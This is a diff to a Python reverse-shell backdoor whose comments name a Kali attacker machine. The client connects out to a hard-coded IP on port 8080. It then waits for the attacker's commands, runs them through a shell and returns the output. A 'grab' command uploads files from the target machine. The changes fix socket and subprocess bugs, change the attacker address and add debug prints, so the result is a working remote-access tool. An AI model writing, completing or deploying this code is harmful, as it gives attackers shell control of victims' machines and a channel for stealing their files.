@@ -11,13 +11,15 @@ import os
 # transfer : send data file into pieces
 # input : s socket object, path is file
 def transfer(s, path):
-        if os.path.exists.path:
+        print("ok");
+        if os.path.exists(path):
+                print("go")
                 f=open(path,'rb')
                 packet = f.read(1024)
                 while len(packet) > 0:
                         s.send(packet)
                         packet=f.read(1024)
-                s.send('DONE').encode() #info:tag end of file
+                s.send(('DONE').encode()) #info:tag end of file
         else :
                 s.send('no file exists'.encode())
 
@@ -27,7 +29,7 @@ def transfer(s, path):
 def connect():
 	s=socket.socket() 
 	#Establish socket with Kali
-	s.connect(("192.168.1.112",8080))
+	s.connect(("192.168.0.139",8080))
 	#Waiting for attacker cmd
 	while True:
 		command =s.recv(1024)
@@ -39,13 +41,17 @@ def connect():
 		elif 'grab' in command.decode():
 			grab, path = command.decode().split('*')
 			try:
+				print("begin")
 				transfer(s,path)
 			except:
 				pass
 		else : # execute shell Popen class create a new process, pipe will read output, send it to Kali
-			CMD = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-			s.send(CMD.stdout.read())
-			s.send(CMD.stderr.read())
+			CMD = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) #, stdin=subprocess.PIPE)
+			#s.send(CMD.stdout.read())
+			#s.send(CMD.stderr.read())
+			output, error = CMD.communicate()
+			s.send(output)
+			s.send(error)
 
 #####################
 #Execute in target side
